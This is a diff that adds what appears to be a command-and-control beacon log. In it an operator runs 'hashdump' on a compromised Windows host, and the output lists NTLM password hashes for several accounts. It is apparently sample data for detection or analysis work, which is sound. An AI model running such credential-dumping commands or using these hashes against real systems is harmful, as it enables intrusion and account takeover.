@@ -1,0 +1,13 @@
+10/13 16:07:26 UTC [metadata] 192.168.3.108 <- 192.168.3.108; computer: COMPUTER001; user: allison_powell *; process: update.exe; pid: 3812; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+10/13 16:10:12 UTC [input] <analyst01> hashdump
+10/13 16:10:12 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+10/13 16:10:25 UTC [checkin] host called home, sent: 82501 bytes
+10/13 16:10:26 UTC [output]
+received password hashes:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d97cfffe74cf16e4d29d27f36feaa09:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:9c0d6cf313c59d7e0c08e0d16ae931b7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:9c0d6cf313c59d7e0c08e0d16ae931b7:::
+jandoe:1010:aad3b435b51404eeaad3b435b51404ee:5cc9af29c97c3e10a9b2304c1d012a2a:::
+jdoe:1008:aad3b435b51404eeaad3b435b51404ee:58a47f058a5ea0e88135a93ac3bfdb71:::
+
+
